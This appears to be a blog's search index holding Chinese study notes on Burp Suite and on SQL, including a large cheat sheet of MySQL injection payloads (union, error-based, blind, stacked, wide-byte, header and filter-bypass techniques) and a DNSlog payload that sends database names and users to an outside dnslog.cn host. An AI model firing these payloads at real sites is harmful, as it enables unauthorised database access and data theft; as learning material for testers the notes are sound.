<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/WXR/2025/01/19/bp%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/"/>
    <url>/WXR/2025/01/19/bp%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="bp使用手册"><a href="#bp使用手册" class="headerlink" title="bp使用手册"></a>bp使用手册</h1><h2 id="1-下载挂载浏览器（也可以不需要）"><a href="#1-下载挂载浏览器（也可以不需要）" class="headerlink" title="1.下载挂载浏览器（也可以不需要）"></a>1.下载挂载浏览器（也可以不需要）</h2><p>在Linux系统里下载火狐浏览器</p><h2 id="2-打开系统终端输入指令burpsuite"><a href="#2-打开系统终端输入指令burpsuite" class="headerlink" title="2.打开系统终端输入指令burpsuite"></a>2.打开系统终端输入指令burpsuite</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250113220345430.png" alt="image-20250113220345430"></p><p>会出现下面这个界面</p><h2 id="3-点击next和Start-Burp最后进入下面的界面"><a href="#3-点击next和Start-Burp最后进入下面的界面" class="headerlink" title="3.点击next和Start Burp最后进入下面的界面"></a>3.点击next和Start Burp最后进入下面的界面</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250113220558590.png" alt="image-20250113220558590"></p><h2 id="4-bp的基本操作"><a href="#4-bp的基本操作" class="headerlink" title="4.bp的基本操作"></a>4.bp的基本操作</h2><h3 id="主要模块及用法"><a href="#主要模块及用法" class="headerlink" title="主要模块及用法"></a>主要模块及用法</h3><ul><li><p>Proxy 模块</p><p>：</p><ul><li><strong>拦截请求和响应</strong>：在“Intercept”选项卡中，可以启用和禁用拦截器，控制哪些请求被拦截。当拦截器启用时，所有通过代理的 HTTP&#x2F;HTTPS 请求和响应都会在这里显示，你可以查看、修改后再发送。</li><li><strong>查看历史记录</strong>：在“HTTP history”选项卡中，可以查看所有的 HTTP&#x2F;HTTPS 请求和响应，还可以对历史记录进行过滤、排序等操作，方便快速定位特定的请求和响应。</li><li><strong>匹配与替换</strong>：在“Match and Replace”选项卡中，可以使用正则表达式来替换 HTTP&#x2F;HTTPS 请求和响应中的文本，实现自动化处理，例如自动添加或删除某些请求头、修改参数值等。</li></ul></li><li><p>Target 模块</p><p>：</p><ul><li><strong>设置测试目标</strong>：通过“Site map”功能，可以以树状结构显示访问过的站点，方便对目标应用程序的资源和端点进行枚举和分析。右键点击站点地图中的节点，可以将其添加到范围内，从而减少其他内置工具的范围，专注于相关资源。</li><li><strong>添加爬行任务</strong>：可以对目标网站进行爬行，以发现更多的页面和资源。在爬行过程中，Burp Suite 会自动分析页面中的链接、表单等元素，并将其添加到站点地图中。</li></ul></li><li><p>Scanner 模块</p><p>：</p><ul><li><strong>新建扫描</strong>：选择“Scanner”模块，点击“New Scan”，输入扫描任务名称和目标网站 URL，然后点击“Start Scan”开始扫描。</li><li><strong>设置扫描范围和类型</strong>：在扫描设置中，可以自定义扫描策略，选择不同的扫描技术和策略，以适应不同的测试场景和需求。还可以设置扫描范围，包括或排除特定的 URL。</li><li><strong>查看扫描结果</strong>：扫描完成后，扫描结果会按照高、中、低三个级别进行分类显示，方便用户快速识别和定位漏洞。点击具体的漏洞，可以查看详细的漏洞信息、影响范围、修复建议等。</li></ul></li><li><p>Intruder 模块</p><p>：</p><ul><li><strong>选择攻击类型</strong>：Intruder 模块提供了多种攻击类型，包括 Sniper、Battering ram、Pitchfork、Cluster bomb 等，可以根据测试需求选择合适的攻击类型。</li><li><strong>设置载荷</strong>：在“Payloads”选项卡中，可以设置载荷类型，如 Runtime file、Custom iterator 等，并配置载荷的具体内容，如字典文件路径、载荷编码方式等。</li><li><strong>启动攻击</strong>：将要攻击的请求发送到 Intruder 模块中，配置好攻击类型和载荷后，点击“Start attack”按钮，Intruder 会按照设置的参数发送多个请求副本，并分析目标服务器的响应，帮助用户发现潜在的安全漏洞。</li></ul></li><li><p>Repeater 模块</p><p>：</p><ul><li><strong>发送请求</strong>：将需要重放的请求从其他模块（如 Proxy、Intruder 等）发送到 Repeater 模块中。</li><li><strong>编辑请求</strong>：在 Repeater 模块中，可以对请求的参数、请求方法、请求头等进行修改，以模拟不同的攻击场景。</li><li><strong>查看响应</strong>：修改请求后，点击“Send”按钮发送请求，然后查看响应结果，分析应用程序对不同请求的响应情况，从而帮助定位漏洞。</li></ul></li><li><p><strong>Comparer 模块</strong>：用于比较两个请求包或响应包的差异。将需要对比的包发送或者粘贴到 Comparer 中，然后可以选择对比文字或者字节的数据，帮助用户快速发现请求和响应之间的不同之处，对于分析漏洞的成因和影响范围非常有帮助。</p></li><li><p><strong>Decoder 模块</strong>：可以对字符串进行编码和解码，支持多种编码方式，如 URL 编码、HTML 实体编码、Base64、十六进制转换等。此外，还可以为常见的哈希函数创建消息摘要，如 MD2、MD5、SHA、SHA256、SHA512 等，方便用户在安全测试过程中进行数据转换和分析。</p></li></ul><h3 id="扩展功能"><a href="#扩展功能" class="headerlink" title="扩展功能"></a>扩展功能</h3><ul><li><strong>Extensions 模块</strong>：用于加载和管理 Burp Suite 的插件，以扩展其功能和特性。通过安装不同的插件，可以实现诸如自动化漏洞利用、增强扫描能力、美化界面等多种功能，提升安全测试的效率和效果。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/WXR/2025/01/19/sql%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <url>/WXR/2025/01/19/sql%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h1 id="sql数据库得知识点"><a href="#sql数据库得知识点" class="headerlink" title="sql数据库得知识点"></a>sql数据库得知识点</h1><h3 id="SQL语言操作"><a href="#SQL语言操作" class="headerlink" title="SQL语言操作"></a>SQL语言操作</h3><ul><li><p>数据查询（DQL - Data Query Language）</p><p>：</p><ul><li><strong>基本查询</strong>：使用<code>SELECT</code>语句从表中查询数据。例如<code>SELECT * FROM students;</code>表示查询学生信息表中的所有数据。</li><li><strong>条件查询</strong>：使用<code>WHERE</code>子句对查询结果进行条件过滤。例如<code>SELECT * FROM students WHERE age &gt; 18;</code>表示查询年龄大于18岁的学生信息。</li><li><strong>排序查询</strong>：使用<code>ORDER BY</code>子句对查询结果进行排序。例如<code>SELECT * FROM students ORDER BY age ASC;</code>表示按年龄升序排序查询学生信息。</li><li><strong>分组查询</strong>：使用<code>GROUP BY</code>子句对查询结果进行分组。例如<code>SELECT gender, COUNT(*) FROM students GROUP BY gender;</code>表示按性别分组统计学生数量。</li></ul></li><li><p>数据更新（DML - Data Manipulation Language）</p><p>：</p><ul><li><strong>插入数据</strong>：使用<code>INSERT INTO</code>语句向表中插入新的数据行。例如<code>INSERT INTO students (name, age, gender) VALUES (&#39;张三&#39;, 20, &#39;男&#39;);</code>表示向学生信息表中插入一条数据。</li><li><strong>更新数据</strong>：使用<code>UPDATE</code>语句对表中的数据行进行更新。例如<code>UPDATE students SET age = 21 WHERE name = &#39;张三&#39;;</code>表示将学生信息表中名字为“张三”的学生的年龄更新为21。</li><li><strong>删除数据</strong>：使用<code>DELETE FROM</code>语句从表中删除数据行。例如<code>DELETE FROM students WHERE age &gt; 22;</code>表示删除学生信息表中年龄大于22岁的学生信息。</li></ul></li><li><p>数据定义（DDL - Data Definition Language）</p><p>：</p><ul><li><strong>创建数据库</strong>：使用<code>CREATE DATABASE</code>语句创建一个新的数据库。例如<code>CREATE DATABASE school;</code>表示创建一个名为“school”的数据库。</li><li><strong>创建表</strong>：使用<code>CREATE TABLE</code>语句创建一个新的表。例如<code>CREATE TABLE students (id int PRIMARY KEY, name varchar(50), age int, gender char(1));</code>表示创建一个学生信息表，包含学号、姓名、年龄、性别等字段。</li><li><strong>修改表结构</strong>：使用<code>ALTER TABLE</code>语句对表的结构进行修改，如添加列、删除列、修改列的数据类型等。例如<code>ALTER TABLE students ADD email varchar(100);</code>表示向学生信息表中添加一个邮箱列。</li><li><strong>删除表</strong>：使用<code>DROP TABLE</code>语句删除表。例如<code>DROP TABLE students;</code>表示删除学生信息表。</li></ul></li><li><p>数据控制（DCL - Data Control Language）</p><p>：</p><ul><li><strong>授权</strong>：使用<code>GRANT</code>语句授予用户对数据库对象的访问权限。例如<code>GRANT SELECT, INSERT ON students TO user1;</code>表示授予用户“user1”对学生信息表的查询和插入权限。</li><li><strong>撤销授权</strong>：使用<code>REVOKE</code>语句撤销用户对数据库对象的访问权限。例如<code>REVOKE INSERT ON students FROM user1;</code>表示撤销用户“user1”对学生信息表的插入权限。</li></ul></li></ul><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>SQL注入是指攻击者通过在Web应用的输入框、URL参数等处插入恶意的SQL语句片段，当这些输入被Web应用不当处理并拼接到正常的SQL查询语句中执行时，从而实现对数据库的非法访问、数据篡改、数据泄露等恶意操作。</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><ol><li><strong>输入恶意SQL片段</strong>：攻击者在Web应用的输入点，如登录表单的用户名、密码输入框，搜索框等，输入精心构造的SQL语句片段。例如，在用户名输入框中输入<code>&#39; OR 1=1 --</code>。</li><li><strong>拼接SQL语句</strong>：Web应用后端代码将用户输入与正常的SQL语句模板进行拼接。以登录功能为例，正常的SQL语句可能是<code>SELECT * FROM users WHERE username = &#39;$username&#39; AND password = &#39;$password&#39;</code>，当拼接上述恶意输入后，语句变为<code>SELECT * FROM users WHERE username = &#39;&#39; OR 1=1 -- AND password = &#39;$password&#39;</code>。</li><li><strong>执行恶意SQL语句</strong>：由于<code>--</code>是SQL注释符号，后面的<code>AND password = &#39;$password&#39;</code>被注释掉，最终执行的SQL语句相当于<code>SELECT * FROM users WHERE username = &#39;&#39; OR 1=1</code>，这将导致查询条件恒为真，返回数据库中所有用户的信息，攻击者从而可以获取到不该获取的数据。</li></ol><h3 id="常见危害"><a href="#常见危害" class="headerlink" title="常见危害"></a>常见危害</h3><ul><li><strong>数据泄露</strong>：攻击者可以查询数据库中的敏感信息，如用户个人信息、密码（尤其是明文存储的密码）、企业商业机密等。</li><li><strong>数据篡改</strong>：攻击者可以修改数据库中的数据，如修改用户权限、篡改交易记录、更改商品价格等，给企业和用户带来巨大损失。</li><li><strong>数据删除</strong>：攻击者可以删除数据库中的重要数据，导致数据丢失，影响业务的正常运行。</li><li><strong>权限提升</strong>：攻击者可能通过SQL注入获取更高权限的数据库账户，进一步控制数据库服务器，甚至入侵整个服务器系统。</li></ul><h3 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h3><ol><li><strong>使用参数化查询</strong>：这是最有效的防范SQL注入的方法之一。参数化查询将用户输入作为参数传递给SQL语句，而不是直接拼接在SQL语句中。例如，在PHP中使用PDO或mysqli的预处理语句功能，可以有效防止SQL注入。</li><li><strong>输入验证</strong>：对用户输入进行严格的验证，限制输入的类型、长度、格式等。例如，对于数字类型的输入，只允许输入数字字符；对于字符串类型的输入，限制长度，并过滤掉特殊字符，如单引号、双引号、分号等。</li><li><strong>使用ORM框架</strong>：对象关系映射（ORM）框架可以自动处理SQL语句的生成和执行，避免了手动拼接SQL语句，从而降低SQL注入的风险。常见的ORM框架有Hibernate、MyBatis等。</li><li><strong>最小权限原则</strong>：为数据库账户分配最小必要的权限，避免使用具有管理员权限的账户连接数据库。例如，对于只读的查询操作，使用只具有查询权限的账户。</li><li><strong>错误处理</strong>：合理处理数据库操作中的错误，避免将详细的错误信息直接显示给用户，因为这些错误信息可能包含数据库的结构等敏感信息，攻击者可以利用这些信息进行SQL注入攻击。</li></ol><h1 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h1><h2 id="一、sql注入概述"><a href="#一、sql注入概述" class="headerlink" title="一、sql注入概述"></a>一、sql注入概述</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息,在实战和测试中，难免会遇见到一些sql注入，下面，我将总结一些常用sql注入中的不同姿势。</p><h2 id="二、寻找sql注入"><a href="#二、寻找sql注入" class="headerlink" title="二、寻找sql注入"></a>二、寻找sql注入</h2><p>测试注入点：</p><p>1.在参数后面添加单引号或双引号，查看返回包，如果报错或者长度变化，可能存在Sql注入</p><p>注入点判断：<code>id=1&#39;（常见）</code>id&#x3D;1” id&#x3D;1’) id&#x3D;1’)) id&#x3D;1”) id&#x3D;1”))</p><p>2.通过构造get、post、cookie请求再相应的http头信息等查找敏感喜喜</p><p>3.通过构造一些语句，检测服务器中响应的异常</p><h2 id="三、sql注入的类型"><a href="#三、sql注入的类型" class="headerlink" title="三、sql注入的类型"></a>三、sql注入的类型</h2><p>附上自己整理的思维导图学习</p><p><img src="https://image.3001.net/images/20220714/1657765090_62cf7ce22bc5cb101dc1b.png!small" alt="image"></p><p>常见的数据库类型，分为关系型数据库和非关系型数据库</p><p>关系型数据库有 <code>Oracle、DB2、PostgreSQL、Microsoft SQL Server、Microsoft Access 和 MySQL</code>等。</p><p>非关系型数据库有 <code>Neo4j、MongoDB、Redis、Memcached、MemcacheDB 和 HBase</code>等</p><h2 id="Mysql注入"><a href="#Mysql注入" class="headerlink" title="Mysql注入"></a>Mysql注入</h2><p><img src="https://image.3001.net/images/20220714/1657765211_62cf7d5ba9f990b10b6f3.png!small" alt="image"></p><h3 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h3><p>数字型：</p><p>测试步骤：</p><p>（1） 加单引号，URL：xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3’；</p><p>对应的sql：select * from table where id&#x3D;3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p><p>（2） 加and 1&#x3D;1 ，URL：xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3 and 1&#x3D;1；</p><p>对应的sql：select * from table where id&#x3D;3’ and 1&#x3D;1 语句执行正常，与原始页面没有差异；</p><p>（3） 加and 1&#x3D;2，URL：xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3 and 1&#x3D;2；</p><p>对应的sql：select * from table where id&#x3D;3 and 1&#x3D;2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异；</p><p>字符型</p><p>测试步骤：</p><p>（1） 加单引号：select * from table where name&#x3D;’admin’’；</p><p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p><p>（2） 加 ‘ and 1&#x3D;1 此时sql 语句为：select * from table where name&#x3D;’admin’ and 1&#x3D;1’ ，也无法进行注入，还需要通过注释符号将其绕过；</p><p>因此，构造语句为：select * from table where name &#x3D;’admin’ and 1&#x3D;–’ 可成功执行返回结果正确；</p><p>（3） 加and 1&#x3D;2— 此时sql语句为：select * from table where name&#x3D;’admin’ and 1&#x3D;2–’则会报错；</p><p>如果满足以上三点，可以判断该url为字符型注入。</p><p>判断列数：</p><p>?id&#x3D;1’ order by 4# 报错</p><p>?id&#x3D;1’ order by 3# 没有报错，说明存在3列</p><p>爆出数据库：</p><p>?id&#x3D;-1’ union select 1,database(),3–+</p><p>?id&#x3D;-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata#</p><p>爆出数据表：</p><p>?id&#x3D;-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’数据库’#</p><p>爆出字段：</p><p>?id&#x3D;-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’数据表’#</p><p>爆出数据值：</p><p>?id&#x3D;-1’ union select 1,group_concat(0x7e,字段,0x7e),3 from 数据库名.数据表名–+</p><p>拓展一些其他函数：</p><p>system_user() 系统用户名</p><p>user() 用户名</p><p>current_user 当前用户名</p><p>session_user()连接数据库的用户名</p><p>database() 数据库名</p><p>version() MYSQL数据库版本</p><p>load_file() MYSQL读取本地文件的函数</p><p>@@datadir 读取数据库路径</p><p>@@basedir MYSQL 安装路径</p><p>@@version_compile_os 操作系统</p><p>多条数据显示函数：</p><p>concat()、group_concat()、concat_ws()</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>extractvalue函数：</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select @@version),0x7e))–+ (爆出版本号)</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select @@version_compile_os),0x7e))–+ (爆出操作系统)</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e))–+ （爆数据库）</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e))–+ （爆数据表）</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 3,1),0x7e))–+（爆字段）</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e))–+ （爆数据）</p><p>updatexml函数：</p><p>细节问题： extractvalue()基本一样，改个关键字updatexml即可,与extractvalue有个很大的区别实在末尾注入加上，如：（1，concat(select @@version),1),而extractvalue函数末尾不加1（数值）</p><p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e),<strong><code>1</code></strong>)–+ （爆数据库）</p><p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),0x7e),1)–+ （爆数据表）</p><p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 3,1),0x7e),1)–+ （爆字段）</p><p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e),1)–+</p><p>exp函数溢出错误：</p><p>在mysql&gt;5.5.53时，则不能返回查询结果</p><p>floor函数：</p><p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select database()),0x7e,floor(rand(0)2))a from information_schema.schemata group by a–+</p><p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ (爆数据库，不断改变limit得到其他)</p><p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ （爆出users表）</p><p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ （爆出password字段）</p><p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select password from security.users limit 2,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ （爆出数值）</p><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>判断注入点：</p><p>?id&#x3D;1’ and sleep(5)–+ &#x2F;&#x2F;正常休眠</p><p>?id&#x3D;1” and sleep(5)–+ &#x2F;&#x2F;无休眠</p><p>?id&#x3D;1’) and sleep(5)–+&#x2F;&#x2F;无休眠</p><p>?id&#x3D;1”) and sleep(5)–+&#x2F;&#x2F;无休眠</p><p>?id&#x3D;1’ and if(length(database())&#x3D;8,sleep(10),1)–+</p><p>爆出数据库：</p><p>?id&#x3D;1’ and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(10))–+</p><p>通过判断服务器没有睡眠，ascii码转换115为s ，那么就得出数据库第一个字符为s,下面就可以一次类推了,就不一</p><p>substr(database(),N,1)可以通过改变N的值来判断数据的地几个字符为什么</p><p>爆出数据表：</p><p>?id&#x3D;1’ and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;”security”limit 0,1),1,1)))&#x3D;101,sleep(5),1)– -</p><p>解释：security的第一张表的第一个字符ascii为101，为字符e</p><p>limit 0,1),N,1还是改变N的的得出第二个字符</p><p>再判断字符（ascii判断）</p><p>?id&#x3D;1” and if(ascii(substr(database(),1,1))&gt;115,1,sleep(3))–+</p><p>（left语句判断）</p><p>?id&#x3D;1’ and if(left(database(),1)&#x3D;’s’,sleep(10),1) –+</p><p>?id&#x3D;1’ and if(left(database(),2)&#x3D;’sa’,sleep(10),1) –+</p><p>Substring函数判断</p><p>type&#x3D;if(substring((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1&#x3D;’a’),11111,sleep(1))–+</p><h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><p>Left判断</p><p>?id&#x3D;1’ and left(database(),1)&#x3D;’s’ –+</p><p>?id&#x3D;1’ and left(database(),2) &gt; ‘sa’ –+</p><p>Like语句判断</p><p>?id&#x3D;1’ and (select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)like ‘e%’–+</p><p>Ascii语句判断</p><p>and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;115–+</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>?id&#x3D;1’ order by 3%23</p><p>?id&#x3D;1’;show tables%23</p><p>?id&#x3D;-1’;show columns from <code>1919810931114514</code>%23</p><p>?id&#x3D;1’; insert into users(id,username,password) values(88,’aaa’,’bbb’)#<br><img src="https://image.3001.net/images/20220714/1657765459_62cf7e536914d9a20eebd.png!small" alt="image"></p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入一般是用于白盒测试、黑盒测试就算是找到注入也没办法攻击。<br><img src="https://image.3001.net/images/20220714/1657765520_62cf7e901e5532a44c092.png!small" alt="image"></p><h3 id="加密解密注入"><a href="#加密解密注入" class="headerlink" title="加密解密注入"></a>加密解密注入</h3><p>Cookie: uname&#x3D;YWRtaW4%3D</p><p>YWRtaW4%3D这是一个base64加密的字符串其中%3D是编码中的&#x3D;符号，把他发送到编码模块当中解密,得到明文</p><p>发现这个是注入点需要将原来的注入方式重新加密发送给服务器，可以构造注入语句进行base64加密进行报错注入</p><p><img src="https://image.3001.net/images/20220714/1657765539_62cf7ea3330691d8a8415.png!small" alt="image"></p><h3 id="Dnslog对外注入"><a href="#Dnslog对外注入" class="headerlink" title="Dnslog对外注入"></a>Dnslog对外注入</h3><p>通常我们面对SQL注入过程中没有回显的情况下，只能通过盲注的方式来判断是否存在SQL注入，但是，使用盲注，手工测试是需要花费大量的时间的，可能会想到使用sqlmap直接去跑出数据，但在实际测试中，使用sqlmap跑盲注，有很大的几率，网站把ip给封掉，这就影响了我们的测试进度，也许你也可以使用代理池</p><p>注入语句：</p><p>?id&#x3D;1’ and (select load_file(concat(‘&#39;,(select hex(user())),’.682y4b.dnslog.cn&#x2F;abc’))) –+</p><p>?id&#x3D;1’ and (select load_file(concat(‘&#39;,(select database()),’.682y4b.dnslog.cn&#x2F;abc’))) –+</p><h3 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h3><p>比如受害者网站URL注入点是经过编码的，不能直接结合sqlmap进行漏洞利用，所以本地搭建一个网站，写一个php脚本编码文件，就可以结合sqlmap工具进行测试。</p><p>因为，注入点经过复杂编码之后，就不能直接结合sqlmap进行漏洞攻击了。或者sqlmap自己编写tamper脚本进行攻击</p><h3 id="搜索框注入"><a href="#搜索框注入" class="headerlink" title="搜索框注入"></a>搜索框注入</h3><p>注入payload：</p><p>%’ and ‘%1%’&#x3D;’%1</p><p>%’ and ‘%1%’&#x3D;’%2</p><p>Sql数据库语句：select * from sqltest where names like ‘%要查询的关键字%’</p><p>a%’ and 1&#x3D;1– 正常</p><p>a%’ and 1&#x3D;2– 错误</p><p>有搜索数据的框可以试试加个%总能大力出奇迹</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>前提</p><p>1.使用了addslashes()函数</p><p>2.数据库设置了编码模式为GBK</p><p>原理：前端输入%df时，首先经过addslashes()转义变成%df%5c%27，之后，在数据库查询前，因为设置了GBK编码，GBK编码在汉字编码范围内的两个字节都会重新编码成一个汉字。然后mysql服务器会对查询的语句进行GBK编码，%df%5c编码成了“运”，而单引号逃逸了出来，形成了注入漏洞</p><p>?id&#x3D;%df’ and 1&#x3D;1 –+</p><p>?id&#x3D;%df’ and 1&#x3D;2 –+</p><p>?id&#x3D;-1%df’ union select 1,2,3 %23</p><h3 id="Cookie注入和Xff注入"><a href="#Cookie注入和Xff注入" class="headerlink" title="Cookie注入和Xff注入"></a>Cookie注入和Xff注入</h3><p>主要是看看程序员有没有在cookie中做了一些过滤，我们有没有可趁之机。</p><p>Cookie: ‘ order by 4–+</p><p>X-Forwarded-For注入</p><p>代表客户端真实的IP，通过修改X-Forwarded-for的值可以伪造客户端IP</p><p>尝试抓包添加插入X-Forwarded-For:127.0.0.1头进行sql注入</p><h3 id="Between注入"><a href="#Between注入" class="headerlink" title="Between注入"></a>Between注入</h3><p>主要用于盲注看页面是否有变化，原理如下，例如username的字符内容是test1，第一个字符是t，a到b搜索不了，页面不正常。 a到t就有了，页面正常</p><p>mysql语句： select * from users where id &#x3D;1 and substr(username,1,1) between ‘a’ and ‘b’;</p><p>select * from users where id &#x3D;1 and substr(username,1,1) between ‘a’ and ‘t’;</p><p>借鉴大佬图片：</p><p><img src="https://image.3001.net/images/20220714/1657765568_62cf7ec07edc75bbb2cd0.png!small" alt="image"></p><h3 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h3><p>mysql语句： select * from limit test limit 1,[可控点] or select … limit [可控点]</p><p>limit后面能够拼接的函数只有into和procedure，into可以用来写文件，本文我们不考虑。在Limit后面 可以用 procedure analyse()这个子查询，而且只能用extractvalue 和 benchmark 函数进行延时</p><p><em><strong>procedure analyse(updatexml(rand(),concat(0x3a,benchmark(10000000,sha1(1)))),1)</strong></em></p><p>select id from users;</p><p>select id from users limit 0,1 union select username from users;</p><p><img src="https://image.3001.net/images/20220714/1657765587_62cf7ed363bca35f96495.png!small" alt="image"></p><p>select field from user where id &gt;0 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</p><p>基于时间盲注：</p><p>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</p><h3 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h3><p>select * from 表名 order by 列名(或者数字) asc；升序(默认升序)</p><p>select * from 表名 order by 列名(或者数字) desc；降序</p><p>当页面出现mysql报错信息时，注入点在 order by后面，此时可以利用报错信息进行注入，尝试报错注入</p><p><img src="https://image.3001.net/images/20220714/1657765602_62cf7ee2335a18b91bc38.png!small" alt="image"></p><p>?sort&#x3D;1 and(select extractvalue(0x7e,concat(0x7e,database(),0x7e)))</p><p>?sort&#x3D;(select 1 from(select 1 and if(ascii(substr((user()),1,1))&#x3D;114,sleep(5),1))x)</p><h2 id="Sql注入绕过姿势"><a href="#Sql注入绕过姿势" class="headerlink" title="Sql注入绕过姿势"></a>Sql注入绕过姿势</h2><h3 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h3><p>两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格：</p><p>payload:</p><p>%20 %09 %0a %0b %0c %0d %a0 %00 &#x2F;**&#x2F; &#x2F;<em>!</em>&#x2F;</p><p>最基本的绕过方法，用注释替换空格： &#x2F;* 注释 *&#x2F;</p><p><img src="https://image.3001.net/images/20220714/1657765618_62cf7ef2f3244c1249103.png!small" alt="image"></p><p>括号绕过空格</p><p>mysql语句：select(user())from dual where(1&#x3D;1)and(2&#x3D;2)</p><p>这种过滤方法常常用于time based盲注,例如：</p><p>?id&#x3D;1%27and(sleep(ascii(mid(database()from(1)for(1)))&#x3D;109))%23</p><h3 id="绕过引号"><a href="#绕过引号" class="headerlink" title="绕过引号"></a>绕过引号</h3><p>这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用<strong>十六进制</strong>来处理这个问题了。users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p><p>select column_name from information_schema.tables where table_name&#x3D;0x7573657273</p><h3 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a>绕过逗号</h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p><p>select substr(database() from 1 for 1);</p><p>select mid(database() from 1 for 1);</p><p>使用join：</p><p>union select 1,2#</p><p>等价于 union select * from (select 1)a join (select 2)b</p><p>使用like:</p><p>select ascii(mid(user(),1,1))&#x3D;80 #</p><p>等价于 select user() like ‘r%’</p><p>对于limit可以使用offset来绕过：</p><p>select * from news limit 0,1 #</p><p>等价于下面这条SQL语句 select * from news limit 1 offset 0</p><h3 id="绕过比较符号"><a href="#绕过比较符号" class="headerlink" title="绕过比较符号()"></a>绕过比较符号()</h3><p>（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）：</p><p>使用greatest()、least（）：（前者返回最大值，后者返回最小值）</p><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。 